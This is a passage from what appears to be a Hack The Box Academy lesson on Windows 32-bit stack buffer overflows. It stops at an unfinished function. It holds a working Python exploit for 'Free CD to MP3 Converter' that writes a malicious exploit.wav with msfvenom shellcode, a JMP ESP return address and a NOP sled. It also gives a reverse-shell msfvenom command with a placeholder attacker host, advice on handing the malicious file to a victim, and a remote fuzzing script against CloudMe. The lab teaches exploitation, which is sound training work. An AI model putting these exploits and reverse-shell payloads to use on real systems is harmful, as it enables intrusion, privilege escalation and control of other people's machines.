+<p>We've thoroughly discussed shellcode generation in the <a href="https://academy.hackthebox.com/course/preview/intro-to-assembly-language">Intro to Assembly Language</a> module and the various methods to do so. In some instances, we may find ourselves limited to a very short buffer space, where we would not have many bytes to write to and may have to use one of the methods discussed to generate a short shellcode. However, we are dealing with thousands of bytes of buffer in our case, so we would not have to worry about such limitations.</p>
+<p>So, to generate our shellcode, we will use <code>msfvenom</code>, which can generate shellcodes for Windows systems, while tools like <code>pwntools</code> currently only support Linux shellcodes.</p>
+<p>First, we can list all available payloads for <code>Windows 32-bit</code>, as follows:</p>
+<p>  Jumping to Shellcode</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ msfvenom -l payloads | grep windows
+
+...SNIP...
+    windows/exec                                        <span class="hljs-keyword">Execute</span> an arbitrary command
+    windows/format_all_drives                           This payload formats all mounted disks <span class="hljs-keyword">in</span> Windows (aka ShellcodeOfDeath). <span class="hljs-keyword">After</span> formatting, this payload <span class="hljs-keyword">sets</span> the volume label <span class="hljs-keyword">to</span> the <span class="hljs-keyword">string</span> specified <span class="hljs-keyword">in</span> the VOLUMELABEL option. <span class="hljs-keyword">If</span> the code <span class="hljs-keyword">is</span> unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">access</span> a drive <span class="hljs-keyword">for</span>
+    windows/loadlibrary                                 <span class="hljs-keyword">Load</span> an arbitrary <span class="hljs-keyword">library</span> <span class="hljs-keyword">path</span>
+    windows/messagebox                                  Spawns a dialog via MessageBox <span class="hljs-keyword">using</span> a customizable title, <span class="hljs-built_in">text</span> &amp; icon
+...SNIP...
+</code></pre>
+<p>For initial testing, let's try <code>windows/exec</code> and execute <code>calc.exe</code> to open the Windows calculator if our exploit is successful. To do this, we'll use <code>CMD=calc.exe</code>, <code>-f 'python'</code> since we are using a python exploit, and <code>-b</code> to specify any bad characters:</p>
+<p>  Jumping to Shellcode</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '<span class="hljs-symbol">\x</span>00'
+
+...SNIP...
+buf =  b""
+buf += b"<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>ec<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>3d<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>29"
+buf += b"<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>b1<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>29"
+buf += b"<span class="hljs-symbol">\x</span>6b<span class="hljs-symbol">\x</span>d4<span class="hljs-symbol">\x</span>a9<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>94<span class="hljs-symbol">\x</span>25<span class="hljs-symbol">\x</span>29<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>7a"
+...SNIP...
+</code></pre>
+<p>Note: We used the <code>-b</code> to showcase how to eliminate any bad characters from our shellcode, where we can add all bad characters we need to eliminate (e.g. <code>'\x00\x0a\x0d'</code>). Even if our shellcode did not have any bad characters, this shellcode should still run, though the final shellcode is usually longer if we specify bad characters</p>
+<p>Next, we can copy the <code>buf</code> variable into our exploit, where we will now define the final function <code>def exploit()</code>, which will be our main exploit code:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">def exploit():
+    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '<span class="hljs-symbol">\x</span>00'
+    buf =  b""
+    buf += b"<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>ec<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>3d<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>29"
+    ...SNIP...
+    buf += b"<span class="hljs-symbol">\x</span>fd<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>a1<span class="hljs-symbol">\x</span>b8<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>43<span class="hljs-symbol">\x</span>c5"
+</code></pre>
+<p>Tip: It is advised as a best practice to add a comment above any shellcode with the command used to generate it, in case we want to modify it or regenerate it in the future, or if we just wanted to know what it will execute.</p>
+<hr>
+<h3 id="the-final-payload">The Final Payload</h3>
+<p>Now that we have our shellcode, we can write the final payload that we'll write to the <code>.wav</code> file to be opened in our program. So far, we know the following:</p>
+<ol>
+<li><code>buffer</code>: We can fill the buffer by writing <code>b"A"*offset</code></li>
+<li><code>EIP</code>: The following 4 bytes should be our return address</li>
+<li><code>buf</code>: After that, we can add our shellcode</li>
+</ol>
+<p>In the previous section, we've found multiple return addresses that can work in executing any shellcode we write on the stack:</p>
+<table>
+<thead>
+<tr>
+<th><code>ESP</code></th>
+<th><code>JMP ESP</code></th>
+<th><code>PUSH ESP; RET</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0014F974</code></td>
+<td><code>00419D0B</code></td>
+<td><code>0047D4F5</code></td>
+</tr>
+<tr>
+<td>-</td>
+<td><code>00463B91</code></td>
+<td><code>00483D0E</code></td>
+</tr>
+<tr>
+<td>-</td>
+<td><code>00477A8B</code></td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td><code>0047E58B</code></td>
+<td>-</td>
+</tr>
+<tr>
+<td>-</td>
+<td><code>004979F4</code></td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<p>Any of these should work in executing the shellcode we write on the stack (feel free to test some of them). We will start with the most reliable one, <code>JMP ESP</code>, and we'll pick the first address <code>00419D0B</code> and write it as our return address.</p>
+<p>To convert it from <code>hex</code> to an address in Little Endian, we'll use a python function called <code>pack</code> found in the <code>struct</code> library. We can import this function by adding the following line at the beginning of our code:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">from <span class="hljs-keyword">struct</span> <span class="hljs-keyword">import</span> pack
+</code></pre>
+<p>Now we can use <code>pack</code> to turn our address into its proper format, and use '<code>&lt;L</code>' to specify that we want it in Little Endian formatting:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">    <span class="hljs-built_in">offset</span> = <span class="hljs-number">4112</span>
+    buffer = b<span class="hljs-string">"A"</span>*<span class="hljs-built_in">offset</span>
+    eip = pack(<span class="hljs-string">'&lt;L'</span>, <span class="hljs-number">0x00419D0B</span>)
+</code></pre>
+<hr>
+<h3 id="shellcode-padding">Shellcode Padding</h3>
+<p>Now that we have <code>buffer</code> and <code>eip</code>, we can add our shellcode <code>buf</code> after them and generate our <code>.wav</code> file. However, depending on the program's current Stack Frame and Stack Alignment, by the time our <code>JMP ESP</code> instruction is executed, the top of the stack address <code>ESP</code> may have moved slightly. The first few bytes of our shellcode may get skipped, which will lead the shellcode to fail. (You can check the <a href="https://academy.hackthebox.com/module/details/85">Intro to Assembly Language</a> module to get a better understanding of Stack Alignment).</p>
+<p>One way to solve this is to add a few junk bytes before our shellcode and keep testing the code until we find out exactly how many bytes get skipped before our shellcode. This is so we can precisely land at the beginning of our shellcode when our <code>JMP ESP</code> instruction is executed. However, we only need to resort to this method if we had a limited buffer space since it takes several attempts to precisely find which byte position of our shellcode the execution starts.</p>
+<p>To avoid having to do this, we can add a few <code>NOP</code> bytes before our shellcode, which has the machine code <code>0x90</code>. The assembly instruction <code>NOP</code> is short for <code>No Operation</code>, and it is used in assembly for things like waiting for other operations to finish. So, if the <code>JMP ESP</code> execution starts at one of these bytes, the program will not crash and will execute these bytes by doing nothing until it reaches the beginning of our shellcode. At which point, our entire shellcode should get executed and should run successfully.</p>
+<p>The stack alignment needed is usually not more than <code>16</code> bytes in most cases, and it may rarely reach <code>32</code> bytes. Since we have a lot of buffer space, we'll just add <code>32</code> bytes of <code>NOP</code> before our shellcode, which should guarantee that the execution starts somewhere within these bytes, and continue to execute our main shellcode:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">    <span class="hljs-keyword">nop</span> = b<span class="hljs-string">"\x90"</span>*<span class="hljs-number">32</span>
+</code></pre>
+<hr>
+<h3 id="writing-payload-to-file">Writing Payload to File</h3>
+<p>With that, our final payload should look as follows:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">    offset = <span class="hljs-number">4112</span>
+    <span class="hljs-keyword">buffer </span>= <span class="hljs-keyword">b"A"*offset
+</span>    <span class="hljs-keyword">eip </span>= pack(<span class="hljs-string">'&lt;L'</span>, <span class="hljs-number">0x00419D0B</span>)
+    <span class="hljs-keyword">nop </span>= <span class="hljs-keyword">b"\x90"*32
+</span>    payload = <span class="hljs-keyword">buffer </span>+ <span class="hljs-keyword">eip </span>+ <span class="hljs-keyword">nop </span>+ <span class="hljs-keyword">buf</span>
+</code></pre>
+<p>We can then write <code>payload</code> to a <code>exploit.wav</code> file, like we did in previous functions:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'exploit.wav'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
+        f.<span class="hljs-built_in">write</span>(payload)
+</code></pre>
+<p>Once we assemble all of these parts, our final <code>exploit()</code> function should look as follows:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">def exploit():
+    # msfvenom -p <span class="hljs-string">'windows/exec'</span> CMD=<span class="hljs-string">'calc.exe'</span> -f <span class="hljs-string">'python'</span> -b <span class="hljs-string">'\x00'</span>
+    buf = b<span class="hljs-string">""</span>
+    ...SNIP...
+    buf += b<span class="hljs-string">"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"</span>
+
+    offset = <span class="hljs-number">4112</span>
+    buffer = b<span class="hljs-string">"A"</span>*offset
+    eip = pack(<span class="hljs-string">'&lt;L'</span>, <span class="hljs-number">0x00419D0B</span>)
+    nop = b<span class="hljs-string">"\x90"</span>*<span class="hljs-number">32</span>
+    payload = buffer + eip + nop + buf
+
+    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'exploit.wav'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
+        f.write(payload)
+
+exploit()
+</code></pre>
+<p>We can now run our code with <code>F5</code> in <code>IDLE</code> to generate the <code>exploit.wav</code> file. Once we do, we can run the <code>Free CD to MP3 Converter</code> program (we don't need to run it in <code>x32dbg</code>) and load our file to it:</p>
+<p><img src="storage\modules\89\win32bof_calc.jpg" alt="Calculator app open in Standard mode, displaying zero."></p>
+<p>As we can see, our program did crash, but we successfully exploited it and ran our shellcode, which opened <code>calc.exe</code>.</p>
+<hr>
+<h3 id="gaining-code-execution">Gaining Code Execution</h3>
+<p>The final step would be to utilize this exploit to gain code execution. Since we are dealing with a local buffer overflow running in a machine we have user-level access to, we will usually use this exploit to escalate our privileges to the admin user if a local admin executed this program. Another way to utilize this is by writing a malicious <code>.wav</code> file that sends back a reverse shell. We would then share this malicious file with a user that uses this vulnerable application and ask them to encode our malicious <code>.wav</code> file. When they do, we would receive a reverse shell and gain control over their PC.</p>
+<p>To do either of these options, all we have to do is change our shellcode to do something else. For local privilege escalation, we can use the same command we used for <code>calc.exe</code>, but use <code>CMD=cmd.exe</code> instead, as follows:</p>
+<p>  Jumping to Shellcode</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '<span class="hljs-symbol">\x</span>00'
+
+...SNIP...
+buf =  b""
+buf += b"<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>c8<span class="hljs-symbol">\x</span>b8<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>9f<span class="hljs-symbol">\x</span>8c<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>5d<span class="hljs-symbol">\x</span>33"
+buf += b"<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>b1<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>ed<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>45<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>8c<span class="hljs-symbol">\x</span>6e"
+...SNIP...
+</code></pre>
+<p>If we wanted to get a reverse shell, there are many <code>msfvenom</code> payloads we can use, which we can get a list of as follows:</p>
+<p>  Jumping to Shellcode</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ msfvenom -<span class="hljs-keyword">l</span> payloads | <span class="hljs-keyword">grep</span> windows | <span class="hljs-keyword">grep</span> <span class="hljs-built_in">reverse</span>
+
+...SNIP...
+    windows/<span class="hljs-keyword">shell</span>/reverse_tcp                           Spawn <span class="hljs-keyword">a</span> piped <span class="hljs-keyword">command</span> <span class="hljs-keyword">shell</span> (staged). Connect back <span class="hljs-keyword">to</span> the attacker
+    windows/<span class="hljs-keyword">shell</span>/reverse_tcp_allports                  Spawn <span class="hljs-keyword">a</span> piped <span class="hljs-keyword">command</span> <span class="hljs-keyword">shell</span> (staged). Try <span class="hljs-keyword">to</span> connect back <span class="hljs-keyword">to</span> the attacker, <span class="hljs-keyword">on</span> <span class="hljs-keyword">all</span> possible ports (<span class="hljs-number">1</span>-<span class="hljs-number">65535</span>, slowly)
+    windows/<span class="hljs-keyword">shell</span>/reverse_tcp_dns                       Spawn <span class="hljs-keyword">a</span> piped <span class="hljs-keyword">command</span> <span class="hljs-keyword">shell</span> (staged). Connect back <span class="hljs-keyword">to</span> the attacker
+    windows/<span class="hljs-keyword">shell</span>/reverse_tcp_rc4                       Spawn <span class="hljs-keyword">a</span> piped <span class="hljs-keyword">command</span> <span class="hljs-keyword">shell</span> (staged). Connect back <span class="hljs-keyword">to</span> the attacker
+    windows/<span class="hljs-keyword">shell</span>/reverse_tcp_rc4_dns                   Spawn <span class="hljs-keyword">a</span> piped <span class="hljs-keyword">command</span> <span class="hljs-keyword">shell</span> (staged). Connect back <span class="hljs-keyword">to</span> the attacker
+    windows/<span class="hljs-keyword">shell</span>/reverse_tcp_uuid                      Spawn <span class="hljs-keyword">a</span> piped <span class="hljs-keyword">command</span> <span class="hljs-keyword">shell</span> (staged). Connect back <span class="hljs-keyword">to</span> the attacker with UUID Support
+    windows/<span class="hljs-keyword">shell</span>/reverse_udp                           Spawn <span class="hljs-keyword">a</span> piped <span class="hljs-keyword">command</span> <span class="hljs-keyword">shell</span> (staged). Connect back <span class="hljs-keyword">to</span> the attacker with UUID Support
+    windows/shell_reverse_tcp                           Connect back <span class="hljs-keyword">to</span> attacker <span class="hljs-built_in">and</span> spawn <span class="hljs-keyword">a</span> <span class="hljs-keyword">command</span> <span class="hljs-keyword">shell</span>
+...SNIP...
+</code></pre>
+<p>We can use the <code>windows/shell_reverse_tcp</code> payload as follows:</p>
+<p>  Jumping to Shellcode</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'
+
+...SNIP...
+buf =  b""
+buf += b"<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>c8<span class="hljs-symbol">\x</span>b8<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>9f<span class="hljs-symbol">\x</span>8c<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>5d<span class="hljs-symbol">\x</span>33"
+...SNIP...
+</code></pre>
+<p>We can replace the <code>buf</code> shellcode in our exploit with either of these and test it. Let's assume we have access to a machine where we have the privilege to run this program as an administrator. We will write the shellcode for local privilege escalation in our exploit, generate our <code>exploit.wav</code> file, and load it into the program:</p>
+<p><img src="storage\modules\89\win32bof_cmd_admin.jpg" alt="Command prompt open at C:\Users\htb-student\Desktop>."></p>
+<p>As we can see, this time, a <code>cmd.exe</code> window popped up, and we see in its title <code>Administrator</code>, which means that it is indeed running with escalated privileges, matching the user who was running <code>Free CD to MP3 Converter</code>.</p>
+<p>Try to use the second shellcode to get a reverse shell on your Linux VM/<code>PwnBox</code>.</p>
+<p>You can download the final exploit code from the following link. Don't forget to rename it from <code>.txt</code> to <code>.py</code>.</p>
+<p><a href="https://academy.hackthebox.com/storage/modules/89/scripts/win32bof_exploit_py.txt">Download win32bof_exploit_py.txt here</a></p>
+<hr>
+<h2 id="remote-fuzzing">Remote Fuzzing</h2>
+<hr>
+<p>We have so far completed a local buffer overflow exercise, which covered all essential parts of a stack-based buffer overflow exercise. When it comes to remote exploitation, the main difference would be in exploit scripting, while the core parts of buffer overflow exploitation are the same.</p>
+<hr>
+<h3 id="debugging-a-remote-program">Debugging A Remote Program</h3>
+<p>Whether we are debugging a local program or one that listens for remote connections, we will have to install and debug it locally on our Windows VM. Once our exploit is fully developed, we can then run it on the remote service without needing local access. If done correctly, the exploit should work, as we will see later.</p>
+<p>This time, we will be debugging a program called <code>CloudMe</code>, an end-user tool for a file sharing service, found on the Desktop of the Windows VM below. As a file-sharing service, this tool listens on a port for any updates from the file server. We can see this if the tool is running, and we list listening ports in <code>Powershell</code>:</p>
+<p>  Remote Fuzzing</p>
+<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">netstat</span> <span class="hljs-selector-tag">-a</span>
+
+..<span class="hljs-selector-class">.SNIP</span>...
+<span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:8888</span>           0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
+<span class="hljs-selector-attr">[CloudMe.exe]</span>
+</code></pre>
+<p>As we can see, the service is listening on port <code>8888</code>, and it has also established a connection to a remote server. We can use the <code>netcat</code> program on the Desktop to interact with this port and see if it accepts any parameters:</p>
+<p>  Remote Fuzzing</p>
+<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Users</span>\<span class="hljs-selector-tag">htb-student</span>\<span class="hljs-selector-tag">Desktop</span>&gt; .\<span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> 127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span> 8888
+?
+<span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Users</span>\<span class="hljs-selector-tag">htb-student</span>\<span class="hljs-selector-tag">Desktop</span>&gt; .\<span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> 127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span> 8888
+<span class="hljs-selector-tag">help</span>
+</code></pre>
+<p>We try sending a few parameters, and it closes the connections without providing us with any output. So, let's try to debug it and fuzz it with large strings to see how it would handle them.</p>
+<p>To debug a program that listens on a remote port, we will follow the same process we did earlier in the module, run the program, and attach to or open it directly in <code>x32dbg</code>. If you have not yet disabled all breakpoints in <code>x32dbg</code>, you should, as this program contains many breakpoints. Refer to the <code>Fuzzing</code> section to see how to do so.</p>
+<hr>
+<h3 id="fuzzing-remote-port">Fuzzing Remote Port</h3>
+<p>Once our program is running and we are attached to it through <code>x32dbg</code>, we can start fuzzing it and try to crash it. Unlike local fuzzing, where we wrote our payloads into a file and then opened the file in our application or manually copied our payload into a text field in the program, with remote fuzzing, we can automate this process through our Python exploit.</p>
+<p>We'll create a new script called <code>win32bof_exploit_remote.py</code> and start by adding a couple of variables for <code>IP</code> and <code>port</code>, such that we can easily change them if we want to use the script on another server. Then, we will write our fuzzing function <code>def fuzz():</code>. We want to send increments of large strings, starting from <code>500</code> bytes long and incrementing by <code>500</code> at each iteration, until we send a long enough string that crashes the program. To accomplish this, we'll loop in a range from <code>0</code> to <code>10,000</code> with increments of <code>500</code>, as follows:</p>
+<p>Code: python</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack
+
+IP = <span class="hljs-string">"127.0.0.1"</span>
+port = <span class="hljs-number">8888</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">10000</span>,<span class="hljs-number">500</span>):
+        buffer = <span class="hljs-string">b"A"</span>*i
+        print(<span class="hljs-string">"Fuzzing %s bytes"</span> % i)
+</code></pre>
+<p>The print statement helps us know the current fuzzing buffer size so that when the program eventually crashes, we know what length caused it to crash.</p>
+<p>Next, we need to connect to the port each time and send our payload to it. To do so, we have to import the <code>socket</code> library as we did at the beginning of our code above, and then establish a connection to the port with the <code>connect</code> function, as follows:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">        s = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET, <span class="hljs-built_in">socket</span>.SOCK_STREAM)
+        s.connect((IP, port))
+</code></pre>
+<p>With that, we should be ready to send our buffer, which we can do through <code>s.send(buffer)</code>. We will also need to wrap our loop in a <code>try/except</code> block, so that we can stop the execution when the program crashes and does not accept connections anymore. Our final <code>fuzz()</code> function should look as follows:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">def fuzz():
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">for</span> i in range(0,10000,500):
+            buffer = b<span class="hljs-string">"A"</span>*i
+            print(<span class="hljs-string">"Fuzzing %s bytes"</span> % i)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IP, port))
+            s.send(buffer)
+            s.close()
+    except:
+        print(<span class="hljs-string">"Could not establish a connection"</span>)
+
+fuzz()
+</code></pre>
+<p>Note: In our case, the program is closing the connection after each input, as we saw earlier, so we are establishing a new connection at each loop iteration. If we could persist the connection, like an ftp or email client, it would be better to establish the connection before the loop, and then loop the <code>s.send(buffer)</code> function.</p>
+<p>Tip: As our server is vulnerable at the entry point after establishing the connection, we are directly sending our payload. It is also possible to interact with the server and pass data like login credentials or certain parameters to reach the vulnerable function, by using <code>send</code> and <code>recv</code>. You can read more about <code>socket</code> functions in the <a href="https://docs.python.org/3/library/socket.html">Official Documentation</a>.</p>
+<p>We run our script and see the following:</p>
+<p>  Remote Fuzzing</p>
+<pre><code class="lang-cmd-session">Fuzzing <span class="hljs-number">0</span> <span class="hljs-built_in">bytes</span>
+Fuzzing <span class="hljs-number">500</span> <span class="hljs-built_in">bytes</span>
+<span class="hljs-params">...</span>SNIP<span class="hljs-params">...</span>
+Fuzzing <span class="hljs-number">9000</span> <span class="hljs-built_in">bytes</span>
+Fuzzing <span class="hljs-number">9500</span> <span class="hljs-built_in">bytes</span>
+</code></pre>
+<p>We see that the entire script ran without crashing the listening services, as port <code>8888</code> was still listening throughout our fuzzing. However, if we check our <code>x32dbg</code> debugger, we see that the front-end <code>cloudme</code> program crashed, and its <code>EIP</code> was overwritten with our <code>A</code>'s buffer:</p>
+<p><img src="storage\modules\89\win32bof_remote_fuzz.jpg" alt="Registers EAX to EDI with values, EIP highlighted as 41414141."></p>
+<p>This indicates that the actual listening service may not be vulnerable since our input never crashes it. However, the front-end program must also be processing this input (e.g., for syncing files), and it is vulnerable to a buffer overflow, which we can exploit through the listening service. This is a unique case that shows that if an input is processed at multiple locations/programs, we must be sure to debug all of them, as only one of them may be vulnerable.</p>
+<hr>
+<h3 id="gradual-fuzzing">Gradual Fuzzing</h3>
+<p>We face the issue here because our program never stops sending payloads since the listening service never crashes. So, how would we be able to know at which buffer length the program crashed?</p>
+<p>We can gradually send our buffer by adding a <code>breakpoint()</code> after <code>s.send(buffer)</code>, such that when we can manually continue by hitting <code>c</code>, we can see whether our input crashed the program and overwrote <code>EIP</code>.</p>
+<p>Tip: You can have both <code>x32dbg</code> and the python IDLE side-by-side, so that you can immediately notice when the program crashes.</p>
+<p>So, we will add our breakpoint to our exploit, restart the program in <code>x32dbg</code>, and start gradually fuzzing the program:</p>
+<p>  Remote Fuzzing</p>
+<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">Fuzzing</span> <span class="hljs-selector-tag">0</span> <span class="hljs-selector-tag">bytes</span>
+&gt; <span class="hljs-selector-tag">c</span>:\<span class="hljs-selector-tag">users</span>\<span class="hljs-selector-tag">htb-student</span>\<span class="hljs-selector-tag">desktop</span>\<span class="hljs-selector-tag">win32bof_exploit_remote</span><span class="hljs-selector-class">.py</span>(<span class="hljs-number">13</span>)<span class="hljs-selector-tag">fuzz</span>()
+<span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">s</span><span class="hljs-selector-class">.send</span>(buffer)
+(Pdb) <span class="hljs-selector-tag">c</span>
+<span class="hljs-selector-tag">Fuzzing</span> <span class="hljs-selector-tag">500</span> <span class="hljs-selector-tag">bytes</span>
+&gt; <span class="hljs-selector-tag">c</span>:\<span class="hljs-selector-tag">users</span>\<span class="hljs-selector-tag">htb-student</span>\<span class="hljs-selector-tag">desktop</span>\<span class="hljs-selector-tag">win32bof_exploit_remote</span><span class="hljs-selector-class">.py</span>(<span class="hljs-number">12</span>)<span class="hljs-selector-tag">fuzz</span>()
+<span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">breakpoint</span>()
+(Pdb) <span class="hljs-selector-tag">c</span>
+<span class="hljs-selector-tag">Fuzzing</span> <span class="hljs-selector-tag">1000</span> <span class="hljs-selector-tag">bytes</span>
+&gt; <span class="hljs-selector-tag">c</span>:\<span class="hljs-selector-tag">users</span>\<span class="hljs-selector-tag">htb-student</span>\<span class="hljs-selector-tag">desktop</span>\<span class="hljs-selector-tag">win32bof_exploit_remote</span><span class="hljs-selector-class">.py</span>(<span class="hljs-number">13</span>)<span class="hljs-selector-tag">fuzz</span>()
+<span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">s</span><span class="hljs-selector-class">.send</span>(buffer)
+(Pdb) <span class="hljs-selector-tag">c</span>
+<span class="hljs-selector-tag">Fuzzing</span> <span class="hljs-selector-tag">1500</span> <span class="hljs-selector-tag">bytes</span>
+&gt; <span class="hljs-selector-tag">c</span>:\<span class="hljs-selector-tag">users</span>\<span class="hljs-selector-tag">htb-student</span>\<span class="hljs-selector-tag">desktop</span>\<span class="hljs-selector-tag">win32bof_exploit_remote</span><span class="hljs-selector-class">.py</span>(<span class="hljs-number">12</span>)<span class="hljs-selector-tag">fuzz</span>()
+<span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">breakpoint</span>()
+(Pdb) <span class="hljs-selector-tag">c</span>
+...
+</code></pre>
+<p>Once the program crashes and <code>EIP</code> gets overwritten, we know that the last amount of bytes we sent is what crashed the program and that the program is vulnerable to a buffer overflow.</p>
+<p>In the next section, we'll continue with the remaining steps we previously followed to exploit buffer overflow vulnerability.</p>
+<hr>
+<h2 id="building-a-remote-exploit">Building a Remote Exploit</h2>
+<hr>
+<p>After fuzzing the listening port, the remaining buffer overflow identification and exploitation steps should be largely the same as local buffer overflow exploitation. The main steps we followed in previous sections were:</p>
+<ol>
+<li>Fuzzing Parameters</li>
+<li>Controlling EIP</li>
+<li>Identifying Bad Characters</li>
+<li>Finding a Return Instruction</li>
+<li>Jumping to Shellcode</li>
+</ol>
+<p>With fuzzing complete, we'll go through the remaining steps in this section until we can successfully exploit the buffer overflow vulnerability.</p>
+<hr>
+<h3 id="controlling-eip">Controlling EIP</h3>
+<p>We'll start by creating a unique pattern <code>2000</code> bytes long, using <code>ERC --pattern c 2000</code> as we previously did: <img src="storage\modules\89\win32bof_remote_pattern.jpg" alt="ASCII pattern with command: ERC --pattern c 2000."></p>
+<p>Now we start writing our <code>eip_offset()</code> function. We'll add our <code>pattern</code> variable like with the pattern under <code>Ascii</code> in the <code>Pattern_Create_1.txt</code> file created on our desktop, like we did with our previous exploit. After that, to send our pattern, we can use the same code we used to fuzz the port:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">def eip_offset():
